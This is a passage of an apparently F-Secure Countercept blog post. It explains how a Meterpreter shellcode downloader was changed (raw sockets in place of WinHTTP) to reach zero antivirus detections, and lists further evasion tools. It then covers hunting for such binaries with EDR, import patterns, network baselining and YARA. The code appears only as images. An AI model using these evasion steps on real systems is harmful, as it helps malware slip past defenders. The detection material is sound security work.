+<p>A re-think was required, which first involved identifying which specific part of the code was causing the alerts. Intuitively, the suspicion was that the functions VirtualAlloc (with a READWRITE_EXECUTE argument) and memcpy caused the 3 engines to deem the file suspicious as these are commonly used for memory injection. However, this proved to be incorrect. In fact, the functions invoked for the HTTP request to grab the remotely hosted shellcode resulted in the suspicious results. The functions used were:</p>
+<ul>
+<li>WinHttpOpen</li>
+<li>WinHttpConnect</li>
+<li>WinHttpOpenRequest</li>
+<li>WinHttpSendRequest</li>
+<li>WinHttpReceiveResponse</li>
+<li>WinHttpQueryDataAvailable</li>
+<li>WinHttpReadData</li>
+<li>WinHttpCloseHandle</li>
+</ul>
+<p>Luckily Windows provides many different libraries that can be used to download data for example WinInet, WinHTTP and Windows Sockets. <a href="https://stackoverflow.com/questions/1011339/how-do-you-make-a-http-request-with-c)" target="_blank" rel="noopener noreferrer">By switching to a more manual socket based implementation</a> the download code was no longer flagged as suspicious by any antivirus engines.</p>
+<p><a href="https://www.countercept.com/assets/Uploads/8-dynamic-shellcode-download-code3.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141615/8-dynamic-shellcode-download-code3.png" alt="8 dynamic shellcode download code3" width="595" height="183" /></a></p>
+<p>This was then combined with the shellcode loading process previously demonstrated.</p>
+<p><a href="https://www.countercept.com/assets/Uploads/9-dynamic-shellcode-download-code4.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141621/9-dynamic-shellcode-download-code4.png" alt="9 dynamic shellcode download code4" width="600" height="814" /></a></p>
+<p>The final payload successfully sent a reverse shell to the listening host and more importantly had a detection rate of zero on VirusTotal!</p>
+<p><a href="https://www.countercept.com/assets/Uploads/10-dynamic-shellcode-download-vt5.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141625/10-dynamic-shellcode-download-vt5.png" alt="10 dynamic shellcode download vt5" width="600" height="234" /></a></p>
+<p>The steps taken in this post show how a few simple modifications can help a payload bypass security controls. There are however many other options that can be used including:</p>
+<ul>
+<li>Inserting a payload within a known good binary (https://github.com/secretsquirrel/the-backdoor-factory)</li>
+<li>Payload encoding/encryption with Veil (https://github.com/Veil-Framework/Veil)</li>
+<li>Using other languages – Powershell, Python, Ruby, C#, Java, Go…</li>
+<li>Code-signing payloads</li>
+</ul>
+<p>And obviously as an attacker you probably want to avoid submitting files to VirusTotal.</p>
+<h3>Hunting At-Scale</h3>
+<p>Having shown how to create a binary to dynamically load code and bypass VirusTotal, we’ll now discuss some of the different ways to hunt for such executables in your environment.</p>
+<p>EDR agents will often give comprehensive visibility into process, network, file, registry and module load events. There are a number of ways these datasets can be used to detect the activity generated by the anomalous binaries shown in this post.</p>
+<h4>Process/File Data</h4>
+<p>When binaries execute EDR will often track the process name, its parent as well metadata for those processes. Often VirusTotal integration is used as well to help detect previously seen malicious binaries. However there are a few different hunting use cases that can be applied to spot anomalous binaries potentially missed by VirusTotal including:</p>
+<ul>
+<li>Prevalence – If a binary has never been seen on VirusTotal or within your environment before it can be classed as anomalous and potentially malicious in nature.</li>
+<li>Metadata forgery – There are a number of different hunts that can be used to detect metadata spoofing, one of the most obvious is to sweep for binaries that use Microsoft metadata but are not Microsoft binaries.</li>
+</ul>
+<h4>Module Load</h4>
+<p>Module load information can help us detect binaries which have potentially suspicious imports such as WinHTTP or anomalous combinations of imports. The binaries constructed in this post required functions to perform network communications as well as memory injection.</p>
+<p>For example the DLLs and functions are:</p>
+<ul>
+<li>WINHTTP.dll_WinHttpReadData</li>
+<li>KERNEL32.dll_HeapAlloc</li>
+<li>KERNEL32.dll_VirtualAlloc</li>
+<li>VCRUNTIME140D.dll_memcpy</li>
+<li>VCRUNTIME140D.dll_memset</li>
+</ul>
+<p>Searching for binaries with module load events associated with these DLLs and an absence of any other DLLs can potentially give us a way to guide our hunting for anomalous binaries like the one created in this post. Do remember though that kernel32 and winhttp are widely used, simply searching for these events in isolation will give you a ton of false positives!</p>
+<h4>Network Data</h4>
+<p>Baselining of process network data can be a powerful technique to spot anomalous binaries on your network. For example you may want to consider:</p>
+<ul>
+<li>Aggregating your data on Filename/Path, Remote IP, Remote Port.</li>
+<li>Filtering out common processes such as browsers, updaters and core windows processes.</li>
+<li>Enriching data based on IP reputation, known good, known bad and uncategorized addresses/domains.</li>
+</ul>
+<p>Such a process should help you find binaries creating anomalous connections such as the ones shown in this post.</p>
+<h4>Memory Injection</h4>
+<p>The Meterpreter payload used in this post works by reflectively loading 3 DLLs into the target process’ memory <a href="https://www.countercept.com/blog/dynamic-shellcode-execution/#Reference1">[1]</a>. Both the process of injecting the code as well as the resulting anomalous memory regions created can be detected using modern EDR tooling.</p>
+<p>Countercept’s EDR agent for example can highlight the anomalous regions with read, write execute permissions and containing DLL indicators such as MZ and PE headers.</p>
+<p><a href="https://www.countercept.com/assets/Uploads/11-dynamic-shellcode-download-memory.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141629/11-dynamic-shellcode-download-memory.png" alt="11 dynamic shellcode download memory" width="600" height="92" /></a></p>
+<p>Visible in the screenshot are 4 reflectively loaded regions (1 corresponds to the stager, whilst 3 correspond to the reflectively loaded DLLs). In order to confirm the implants are Meterpreter there are several different mechanisms available. The first and most primitive is to look at the module sizes of the regions which roughly align to the sizes of the 3 Meterpreter DLLs. An alternative method would be to analyze the contents of the regions themselves, either manually or using YARA.</p>
+<h4>YARA</h4>
+<p>There are a number of different ways to analyse executables at scale, one option is to use YARA signatures which can help you scan for contents within files on disk or loaded into memory as running processes.</p>
+<h5>Strings</h5>
+<p>One of the simplest steps to take during any kind of malware analysis or reversing is looking at the strings present within a binary or memory dump. The strings output for our malicious binary is shown below:Moving onto the second binary, the Windows C++ program that calls the shellcode written into the source code, we can use a similar detection method.</p>
+<p><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141633/12-dynamic-shellcode-download-strings.png" alt="12 dynamic shellcode download strings" width="600" height="202" /></p>
+<p>Without any other context these strings already give a good indication about the binary’s behavior. The presence of the IP address (172.16.28.46) and WinHTTP calls suggest the program may connect to this address. Additionally, it seems logical that the program may attempt to download the file revshell.txt, which actually contained the shellcode payload.</p>
+<h5>Shellcode detection</h5>
+<p>The first two examples in this post contained shellcode within the binary itself whereas the final binaries would dynamically download and store shellcode within memory. In both scenarios it would be possible to detect the shellcode as default msfvenom payloads (like windows/meterpreter/reverse_tcp) have common hex instructions regardless of the ip/port used. The C++ code for our file is below:</p>
+<p>To demonstrate how we could spot this we’ll open our binary with Radare. Searching for the first few hex instructions we are able to find the shellcode.</p>
+<p><a href="https://www.countercept.com/assets/Uploads/14-dynamic-shellcode-download-radare.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141640/14-dynamic-shellcode-download-radare.png" alt="14 dynamic shellcode download radare" width="600" height="651" /></a></p>
+<p>After confirming the location we can grab 341 bytes (the size of the payload) to get the full payload. To perform this at scale we could convert this simple hex search into a Yara signature.</p>
+<h4>Conclusion</h4>
+<p>Data enrichment from sources such as VirusTotal can help security teams efficiently spot known malicious files. However, as this blog post demonstrates, relying on VirusTotal alone is not enough to catch suspicious files as even in 2019 it is relatively easy to write simple executables that can evade being detected by all majority AV engines.</p>
+<p>Advanced attack detection requires ‘detection-in-depth’ and combining of data sources to increase the chances of detecting suspicious activity. Modern EDR provides a great starting point.</p>
+<h4>References</h4>
+<p><a name="Reference1"></a>[1] <a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads" target="_blank" rel="noopener noreferrer">https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads</a></p>
+                        </article>
+                    </div>
+
+                    <div class="l-blog__meta">
+                        <div class="l-blog__author">
+                            
+
+    <div class="c-blog-author">
+
+        <div class="c-blog-author__avatar">
+            <a href="https://blog.f-secure.com/author/noorah/">
+                <img src="https://blog-assets.f-secure.com/wp-content/uploads/2018/07/02055722/Blog-picture.png" alt="">            </a>
+        </div>
+
+        <div class="c-blog-author__text">
+            <h5>
+                <a href="https://blog.f-secure.com/author/noorah/">
+                    Noora Hyvärinen                </a>
+            </h5>
+            <p class="c-blog-author__time">
+                <span>12.03.19</span>
+                <span>9 min. read</span>
+            </p>
+        </div>
+
+    </div>
+
+                        </div>
+                        <div class="l-blog__sharing">
+                            <div class="c-share c-share--right">
+    <h5 class="c-share__title">Share</h5>
+    <ul class="c-share__list">
+                    <li>
+                <a href="http://twitter.com/share?url=https://SHARE_SITE_URL/dynamic-shellcode-execution/&text=Dynamic+Shellcode+Execution" title="Share on Twitter" data-some-link="twitter" class="twitter">
+                    <i class="fab fa-twitter"></i>
+                </a>
+            </li>
+                    <li>
+                <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://SHARE_SITE_URL/dynamic-shellcode-execution/&source=Dynamic+Shellcode+Execution" title="Share on Linkedin" data-some-link="linkedin" class="linkedin">
+                    <i class="fab fa-linkedin-in"></i>
+                </a>
+            </li>
+                    <li>
+                <a href="http://www.facebook.com/sharer/sharer.php?u=https://SHARE_SITE_URL/dynamic-shellcode-execution/" title="Share on Facebook" data-some-link="facebook" class="facebook">
+                    <i class="fab fa-facebook-f"></i>
+                </a>
+            </li>
+            </ul>
+</div>
+                        </div>
+                    </div>
+
+                    
+                        <div class="l-blog__categories">
+                            <p class="text-dim">Categories</p>
+
+                            <div class="c-category-list">
+                                <a href="https://blog.f-secure.com/category/threats-research/" rel="category tag">Threats &amp; Research</a>                            </div>
+                        </div>
+
+                    
+                        <div class="l-blog__tags">
+                            <p class="text-dim">Tags</p>
+
+                            <ul class="c-tags-ul">
+                                                                    <li><a href="https://blog.f-secure.com/tag/f-secure-countercept/">F-Secure Countercept</a></li>
+                                                                    <li><a href="https://blog.f-secure.com/tag/managed-detection-and-response/">Managed Detection and Response</a></li>
+                                                            </ul>
+                        </div>
+
+                    
+                    <div class="l-blog__comments">
+                        
+<div id="comments" class="c-comments">
+
+    
+</div><!-- #comments -->
+
+<div class="c-comment-form">
+
+    <h3 id="reply-title" class="comment-reply-title">
+        Leave a comment    </h3>
+
+    <p class="c-comment-form__message c-comment-form__message--error js-comment-form-dynamic-error-message"></p>
+    <p class="c-comment-form__message c-comment-form__message--error js-comment-form-error-message">Oops! There was an error posting your comment. Please try again.</p>
+    <p class="c-comment-form__message c-comment-form__message--success js-comment-form-success-message">Thanks for participating! Your comment will appear once it's approved.</p>
+
+    <div class="js-comment-form-loader">
+        <div class="c-loading-spinner js-loading-spinner">
+            <div class="c-loading-spinner__spinner"></div>
+            <p>Posting comment...</p>
+        </div>
+    </div>
+
+    <div class="js-comment-form-container">
+
+        <form class="js-comment-form">
+
+            <p class="comment-notes">
+                <span id="email-notes">Your email address will not be published.</span>
+                Required fields are marked <span class="required">*</span>            </p>
+            <p class="comment-form-comment">
+                <label for="comment">Comment</label>
+                <textarea id="comment" name="comment" class="js-content" cols="45" rows="8" maxlength="65525" required="required"></textarea>
+            </p>
+            <input name="wpml_language_code" value="en" type="hidden">
+            <p class="comment-form-author">
+                <input placeholder="Name *" id="author" class="js-author-name" name="author" value="" size="30" maxlength="245" required="required" type="text">
+            </p>
+            <p class="comment-form-email">
+                <input placeholder="Email *" id="email" class="js-author-email" name="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required="required" type="email">
+            </p>
+            <p class="comment-form-url">
+                <input placeholder="Website" id="url" class="js-author-url" name="url" value="" size="30" maxlength="200" type="text">
+            </p>
+            <p class="form-submit">
+                <input name="submit" id="submit" class="submit" value="Post Comment" type="submit">
+                <input name="comment_post_ID" value="18413" class="js-post" id="comment_post_ID" type="hidden">
+                <input name="comment_parent" id="comment_parent" value="0" type="hidden">
+            </p>
+
+        </form>
+
+    </div>
+
+
+</div>
+                    </div>
+
+                </div>
+
+                <div class="l-blog__sidebar" data-sticky="parent">
+                    
+<div class="c-sidebar">
+
+    <div class="c-sidebar-block c-sidebar-block--light s-context--dim"><div class="c-newsletter-form">
+
+    <form id="newsletter-form" method="post" name="2018-06-27_BlogNewsletter" action="">
+
+        <h4 class="c-newsletter-form__title">Sign up for our newsletter</h4>
+        <p class="c-newsletter-form__description">Are you interested in</p>
+
+        <div class="c-newsletter-form__checkboxes">
+
+            <label for="newsletter-form-interests-home-security">
+                <input id="newsletter-form-interests-home-security" type="checkbox" name="interest" value="Home Security">
+                <span>Home Security</span>
+            </label>
+
+            <label for="newsletter-form-interests-business-security">
+                <input id="newsletter-form-interests-business-security" type="checkbox" name="interest" value="Business Security">
+                <span>Business Security</span>
+            </label>
+
+            <label for="newsletter-form-interests-threats-hacks">
+                <input id="newsletter-form-interests-threats-hacks" type="checkbox" name="interest" value="Threats &amp; Research">
+                <span>Threats &amp; Research</span>
+            </label>
+
+            <label for="newsletter-form-interests-f-secure-life">
+                <input id="newsletter-form-interests-f-secure-life" type="checkbox" name="interest" value="F-Secure Life">
+                <span>F-Secure Life</span>
+            </label>
+
+        </div>
+
+        <div class="c-newsletter-form__input" id="emailWrapper">
+            <label style="margin-left:0;" for="field2" class="label customFont translate required" data-lang="emailAddress">Email address*</label>
+            <input id="field2" class="bg-grayLighter translate required" name="emailAddress" pattern="[a-zA-Z0-9.-_-+]{1,}@[a-zA-Z.-]{2,}[.]{1}[a-zA-Z]{2,}" type="email" required placeholder="Email address*" data-lang="emailAddress">
+        </div>
+
+        <input type="hidden" name="elqFormName" value="2018-06-27_BlogNewsletter">
+        <input type="hidden" name="elqSiteID" value="2484">
+        <input type="hidden" name="interestAreasBlogNewsletter1" value="">
+        <input type="hidden" name="elqCampaignId">
+        <input type="hidden" name="redirectUrl" value="https://blog.f-secure.com/dynamic-shellcode-execution/?modal=subscription-thankyou">
+        <input type="hidden" name="language" value="English">
+        <input type="hidden" name="version" value="en">
+
+        <div class="c-newsletter-form__submit c-newsletter-form__submit--center">
+
+            <p class="js-newsletter-form-message c-newsletter-form__pick-one">Please select at least one interest.</p>
+
+            <button class="submit btn btn-primary translate" data-track-event="subscribe " data-track-name="subscription form" data-lang="sendSubscribe">
+                Subscribe            </button>
+
+        </div>
+
+    </form>
+</div>
+
+
+
+<script type="text/javascript">
+
+let form = document.getElementById("newsletter-form");
+form.addEventListener("submit", (e) => {
+
+    e.preventDefault();
+
+    form.setAttribute("action", "https://profiling.f-secure.com/e/f2");
+
+    let interests = [];
+    let interestElements = document.querySelectorAll("input[name=interest]");
+    for (var i = 0; i < interestElements.length; i++) {
+        if (interestElements[i].checked) {
+            interests.push(interestElements[i].getAttribute("value"));
+        }
+    }
+    document.querySelector("input[name=interestAreasBlogNewsletter1]").setAttribute("value", interests.join("::"));
+
+    if (interests.length == 0) {
+        document.querySelector(".js-newsletter-form-message").style.display = "block";
+    } else {
+        form.submit();
+    }
+    // return false;
+
+});
+
+
+</script></div><div class="c-sidebar-block">
+
+    <h5 class="c-sidebar-block__title">
+        Highlighted article    </h5>
+
+    
+<div class="c-promo js-clickable" data-url="https://blog.f-secure.com/what-are-infostealers/">
+
+            <div class="c-promo__image">
+            <div class="c-background-image" style="background-image:url(https://blog-assets.f-secure.com/wp-content/uploads/2020/09/21182132/bike-177029_1920-1024x682.jpg);"></div>
+
+            <h5 class="c-promo__label">
+                <a href="https://blog.f-secure.com/category/home-security/">
+                    Home Security                </a>
+            </h5>
+        </div>
+    
+    <div class="c-promo__content">
+        <h4 class="c-promo__title">
+            <a href="https://blog.f-secure.com/what-are-infostealers/" title="What Are Infostealers?">
+                What Are Infostealers?            </a>
+        </h4>
+
+        
+        <div class="c-promo__meta">
+            <p class="c-promo__author">
+                Fennel Aurora            </p>
+            <p class="c-promo__time">
+                08.10.20            </p>
+                        <p class="c-promo__read-time">
+                11 min. read            </p>
+                    </div>
+    </div>
+
+</div>
+
+</div>
+
+</div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    
+
+    
+    <section class="b-blog b-blog--space-above">
+        <div class="b-blog__container">
+            <h2>
+                Related posts            </h2>
+        </div>
+
+        <div class="b-blog__container">
+            <div class="l-related-posts">
+
+                
+                    <div class="l-related-posts__item">
+                        
+
+<div class="c-hero js-clickable" data-url="https://blog.f-secure.com/what-are-infostealers/">
+
+            <div class="c-background-image" style="background-image:url(https://blog-assets.f-secure.com/wp-content/uploads/2020/09/21182132/bike-177029_1920-1351x900.jpg);"></div>
+        <div class="c-overlay--fade"></div>
+
+    <div class="c-hero__content">
+        <h2 class="c-hero__title">
+            <a href="https://blog.f-secure.com/what-are-infostealers/" title="What Are Infostealers?">
+                What Are Infostealers?            </a>
+        </h2>
+
+        <div class="c-hero__cta">
+                        <a class="c-cta-link" href="https://blog.f-secure.com/what-are-infostealers/">Read article</a>
+        </div>
+
+        <div class="c-hero__meta">
+            <p class="c-hero__author">
+                Fennel Aurora            </p>
+            <p class="c-hero__time">
+                08.10.20            </p>
+                        <p class="c-hero__read-time">
+                11 min. read            </p>
+                    </div>
+    </div>
+
+    <h5 class="c-hero__label">
+        <a href="https://blog.f-secure.com/category/home-security/">
+            Home Security        </a>
+    </h5>
+</div>
+                    </div>
+
+                
+                    <div class="l-related-posts__item">
+                        
+
+<div class="c-hero js-clickable" data-url="https://blog.f-secure.com/podcast-2020-threats-so-far/">
+
+            <div class="c-background-image" style="background-image:url(https://blog-assets.f-secure.com/wp-content/uploads/2018/06/27081619/Malware_1940x970-1600x800.jpg);"></div>
+        <div class="c-overlay--fade"></div>
+
+    <div class="c-hero__content">
+        <h2 class="c-hero__title">
+            <a href="https://blog.f-secure.com/podcast-2020-threats-so-far/" title="Episode 44| 2020 in Cyber Threats, So Far: COVID-19&#8217;s Effects, Ransomware&#8217;s Latest Tricks">
+                Episode 44| 2020 in Cyber Threats, So Far: COVID-19&#8217;s Effects, Ransomware&#8217;s Latest Tricks            </a>
+        </h2>
+
+        <div class="c-hero__cta">
+                        <a class="c-cta-link" href="https://blog.f-secure.com/podcast-2020-threats-so-far/">Read article</a>
+        </div>
+
+        <div class="c-hero__meta">
+            <p class="c-hero__author">
+                Melissa Michael            </p>
+            <p class="c-hero__time">
+                17.09.20            </p>
+                        <p class="c-hero__read-time">
+                24 min. read            </p>
+                    </div>
+    </div>
+
+    <h5 class="c-hero__label">
+        <a href="https://blog.f-secure.com/category/podcasts/">
+            Podcasts        </a>
+    </h5>
+</div>
+                    </div>
+
+                
+                    <div class="l-related-posts__item">
+                        
+
+<div class="c-hero js-clickable" data-url="https://blog.f-secure.com/attack-landscape-h1-2020/">
+
+            <div class="c-background-image" style="background-image:url(https://blog-assets.f-secure.com/wp-content/uploads/2020/08/05161203/business-Japan-Yokohama-cityscape-top2-1350x900.jpg);"></div>
+        <div class="c-overlay--fade"></div>
+
+    <div class="c-hero__content">
+        <h2 class="c-hero__title">
+            <a href="https://blog.f-secure.com/attack-landscape-h1-2020/" title="Attack landscape update: Facebook phishing, COVID-19 spam, and more">
+                Attack landscape update: Facebook phishing, COVID-19 spam, and more            </a>
+        </h2>
+
+        <div class="c-hero__cta">
+                        <a class="c-cta-link" href="https://blog.f-secure.com/attack-landscape-h1-2020/">Read article</a>
+        </div>
+
+        <div class="c-hero__meta">
+            <p class="c-hero__author">
+                Adam Pilkey            </p>
+            <p class="c-hero__time">
+                17.09.20            </p>
+                        <p class="c-hero__read-time">
+                2 min. read            </p>
+                    </div>
+    </div>
+
+    <h5 class="c-hero__label">
+        <a href="https://blog.f-secure.com/category/threats-research/">
+            Threats &amp; Research        </a>
+    </h5>
+</div>
+                    </div>
+
+                
+                    <div class="l-related-posts__item">
+                        
+<div class="c-promo js-clickable" data-url="https://blog.f-secure.com/cc-driver-combating-cybercriminality-through-understanding-of-human-and-technical-drivers/">
+
+            <div class="c-promo__image">
+            <div class="c-background-image" style="background-image:url(https://blog-assets.f-secure.com/wp-content/uploads/2020/09/16110651/business-office-screens-group1-1024x682.jpg);"></div>
+
+            <h5 class="c-promo__label">
+                <a href="https://blog.f-secure.com/category/threats-research/">
+                    Threats &amp; Research                </a>
+            </h5>
+        </div>
+    
+    <div class="c-promo__content">
+        <h4 class="c-promo__title">
+            <a href="https://blog.f-secure.com/cc-driver-combating-cybercriminality-through-understanding-of-human-and-technical-drivers/" title="CC-DRIVER &#8211; Combating cybercriminality through understanding of human and technical drivers">
+                CC-DRIVER &#8211; Combating cybercriminality through understanding of human and technical drivers            </a>
+        </h4>
+
+        
+        <div class="c-promo__meta">
+            <p class="c-promo__author">
+                Andrew Patel            </p>
+            <p class="c-promo__time">
+                16.09.20            </p>
+                        <p class="c-promo__read-time">
+                2 min. read            </p>
+                    </div>
+    </div>
+
+</div>
+                    </div>
+
+                
+            </div>
+        </div>
+    </section>
+
+    
+</div>
+
+</div><!-- end of .page-content -->
+
+<footer class="b-footer">
+
+    <div class="b-footer__container">
+
+        <div class="b-footer__logo">
+            <a href="https://blog.f-secure.com" title="F-Secure Blog">
+                
+<!-- Generator: Adobe Illustrator 21.1.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 841.9 245.3" style="enable-background:new 0 0 841.9 245.3;" xml:space="preserve">
+<g>
+	<g>
+		<g>
+			<path d="M600.5,198.3c0-2-1-3-4.2-3c-0.9,0-2.1,0.1-2.8,0.2v8.8h2.1v-3h0.9l1.6,3h2.5l-2.1-3.4
+				C599.7,200.5,600.5,199.6,600.5,198.3z M596.4,199.8h-0.7V197c0.2,0,0.5,0,0.7,0c1.8,0,2,0.4,2,1.4
+				C598.4,199.4,597.9,199.8,596.4,199.8z"/>
+			<path d="M596.9,191c-5.9,0-8.9,3-8.9,8.9c0,5.9,3,8.9,8.9,8.9c5.9,0,8.9-3,8.9-8.9C605.8,194.1,602.8,191,596.9,191z
+				 M596.9,207.1c-5.2,0-7.2-1.9-7.2-7.2c0-5.3,2-7.2,7.2-7.2c5.1,0,7.2,1.9,7.2,7.2C604.1,205.2,602,207.1,596.9,207.1z"/>
+			<path d="M9.8,110.7c0-1.5,0.3-1.8,1.8-1.8h58.2c1.5,0,1.8,0.3,1.8,1.8v17.5c0,1.5-0.3,1.8-1.8,1.8H33.7v21.3h30.1
+				c1.5,0,1.8,0.3,1.8,1.8v17.2c0,1.5-0.3,1.8-1.8,1.8H33.7v33.1c0,1.5-0.3,1.8-1.8,1.8H11.6c-1.5,0-1.8-0.3-1.8-1.8V110.7z"/>
+			<path d="M82.7,172.3c-1.5,0-1.8-0.3-1.8-1.8v-17.2c0-1.5,0.3-1.8,1.8-1.8h29.8c1.5,0,1.8,0.3,1.8,1.8v17.2c0,1.5-0.3,1.8-1.8,1.8
+				H82.7z"/>
+			<path d="M147.7,135.7c0,6.5,3.8,7.8,18.5,12.1c21,6.1,28.8,14.2,28.8,30.6c0,21.3-17.9,30.4-38.2,30.4c-11.6,0-22.6-3.3-28.9-6.8
+				c-1-0.5-1.5-1-1.5-2.3v-12.9c0-1.1,0.3-1.5,1.3-1.5c2.1,0,15,3.6,27.4,3.6c11.1,0,16.2-2.6,16.2-9.3c0-6.6-4.6-8.4-17.7-11.9
+				c-22-6-29.4-14.1-29.4-30.4c0-19.3,15.6-30.1,34.6-30.1c11.1,0,20,2.3,28.6,6.8c1.2,0.7,1.5,1,1.5,2.3v12.9
+				c0,1.2-0.7,1.5-1.5,1.5c-2.8,0-14.4-3.6-27.3-3.6C151.1,127.1,147.7,130.6,147.7,135.7z"/>
+			<path d="M228,176.4c0.8,10.6,6.6,13.6,19.3,13.6c12.7,0,22.3-3.2,24.6-3.2c1,0,1.5,0.2,1.5,1.5v12.2c0,1.5-0.7,1.8-1.8,2.3
+				c-6.9,3-16.9,6-28.8,6c-24.3,0-38.4-11.1-38.4-38.2c0-25.6,13.9-39.5,37.4-39.5c26.5,0,34.7,15.9,34.7,37.4v6.1
+				c0,1.5-0.3,1.8-1.8,1.8H228z M227.9,163.2h26.5c0-10.7-3.5-15-12.4-15C233.8,148.1,228.4,152.4,227.9,163.2z"/>
+			<path d="M323.6,131.1c9.4,0,18.8,2.8,25.1,5.8c1.5,0.7,1.7,1,1.7,2.5v11.9c0,0.8-0.2,1.5-1.2,1.5c-2.3,0-11.2-2.8-21.7-2.8
+				c-12.9,0-17.7,6.9-17.7,20c0,13.1,4.8,20,17.7,20c10.4,0,20-3.2,22.3-3.2c1,0,1.2,0.7,1.2,1.5v12.2c0,1.5-0.2,1.8-1.7,2.5
+				c-6.3,3-16.4,5.8-25.8,5.8c-25.6,0-37.4-15.9-37.4-38.9C286.2,147,298,131.1,323.6,131.1z"/>
+			<path d="M398.4,208.8c-20.3,0-35.7-6.4-35.7-30.3v-44.3c0-1.5,0.3-1.8,1.8-1.8h19.8c1.5,0,1.8,0.3,1.8,1.8v41.2
+				c0,10.1,3.3,14.5,13.4,14.5c4.1,0,8.3-0.2,11.4-0.5v-55.3c0-1.5,0.3-1.8,1.8-1.8h19.8c1.5,0,1.8,0.3,1.8,1.8v68.7
+				c0,1.5-0.2,1.7-1.3,2C423.4,207.2,410.3,208.8,398.4,208.8z"/>
+			<path d="M485.4,150.4c-4.3,0-8.4,0.5-10.9,1.5v53.4c0,1.5-0.3,1.8-1.8,1.8h-19.8c-1.5,0-1.8-0.3-1.8-1.8v-66.2
+				c0-1.2,0.5-1.7,1.5-2c8.9-3.5,18.3-6.1,28.9-6.1c6.3,0,12.4,0.5,17.9,2.1c1,0.3,1.2,0.7,1.2,1.7v14.9c0,1.5-0.5,1.6-1.5,1.6
+				C497.1,151.4,492.8,150.4,485.4,150.4z"/>
+			<path d="M528.9,176.4c0.8,10.6,6.6,13.6,19.3,13.6c12.7,0,22.3-3.2,24.6-3.2c1,0,1.5,0.2,1.5,1.5v12.2c0,1.5-0.6,1.8-1.8,2.3
+				c-7,3-16.9,6-28.8,6c-24.3,0-38.4-11.1-38.4-38.2c0-25.6,13.9-39.5,37.4-39.5c26.5,0,34.7,15.9,34.7,37.4v6.1
+				c0,1.5-0.3,1.8-1.8,1.8H528.9z M528.7,163.2h26.5c0-10.7-3.5-15-12.4-15C534.6,148.1,529.2,152.4,528.7,163.2z"/>
+		</g>
+		<path d="M830.6,31.8C754.9,5.4,675.4,4.2,605.2,25.7c-15,4.6-19,17.2-16.4,27.9c4,16.3,9.9,34.9,17,51.8c0.1,0.3,0.3,0.2,0.3-0.3
+			c-0.9-7.9,5.1-17.9,17.1-21.6c66.5-20.2,124.6-15.2,176.3,2.3c8.7,3,18.5-1.7,21.3-10.7c7.1-22.8,10-38.4,10.7-42.2"/>
+		<g>
+			<path d="M655.4,81.9c-8.8,1.9-20.8,4.7-29.8,7.8c-18.1,6.2-17.3,28.1-7.6,35.2c0.7-4.1,5-9.6,9.9-11.5c18.1-7,37.4-11.3,57-13
+				C675,96.3,665.2,90.5,655.4,81.9z"/>
+		</g>
+		<path d="M799.2,126c-52.2-25-115.1-26.8-166.9-6.7c-8.5,3.3-14,13.7-8.5,23.7c8.7,15.8,19.5,32.6,31.9,48.7
+			c-1.7-5.9,1.3-16.9,12.9-20.5c31.9-9.8,65.4-5.7,87.8,3.3c6.3,2.6,15.1,1,20.2-6.5c11-16.5,21-36.3,23.2-40.7
+			C800.1,126.8,799.8,126.3,799.2,126z"/>
+		<g>
+			<path d="M747.4,204.8c-5.7-1.6-19.8-12.7-25.3-18.2c-3.5-3.5-8.5-8.4-13.9-14.3c-12.2,0-24.1,1.3-36.7,5.3
+				c-11.7,3.7-12.8,17.4-7.7,24.4c8.8,10.8,14.8,16.8,24.6,26.8c10.2,10.5,28.3,10.8,38.8,0.2c7.6-7.7,12.3-12.7,20.9-22.4
+				C748.4,205.9,748.2,205,747.4,204.8z"/>
+		</g>
+	</g>
+</g>
+</svg>
+                
+            </a>
+        </div>
+
+
+                <div class="b-footer__special-links">
+
+            <ul id="menu-footer-top-menu" class=""><li id="menu-item-18241" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18241"><a href="https://blog.f-secure.com/about-this-blog/">About This Blog</a></li>
+<li id="menu-item-18242" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18242"><a href="http://www.f-secure.com">F-Secure</a></li>
+<li id="menu-item-18243" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18243"><a href="https://www.f-secure.com/en/web/about_global/contact">Contact us</a></li>
+</ul>
+        </div>
+        
+    </div>
+
+        <div class="b-footer__container">
+
+        <div class="b-footer__navigation">
+            <ul id="menu-footer-col-1" class="c-page-navigation-footer"><li id="menu-item-18494" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-18494"><a href="https://blog.f-secure.com/">Back to front page</a></li>
+<li id="menu-item-22877" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22877"><a href="https://www.f-secure.com/en/web/legal/privacy/website">Privacy Policy</a></li>
+<li id="menu-item-22878" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22878"><a href="https://www.f-secure.com/en/web/legal/privacy/website">Terms of Service</a></li>
+</ul>        </div>
+
+        <div class="b-footer__navigation">
+                    </div>
+
+        <div class="b-footer__social-media">
+            
+<div class="c-social-media">
+
+    <h5 class="c-social-media__title">
+        Follow us    </h5>
+
+    <ul class="c-social-media__list">
+                    <li>
+                <a href="https://www.facebook.com/F-Secure-107471754306/">
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                    <span class="c-social-media__service">facebook</span>
+                </a>
+            </li>
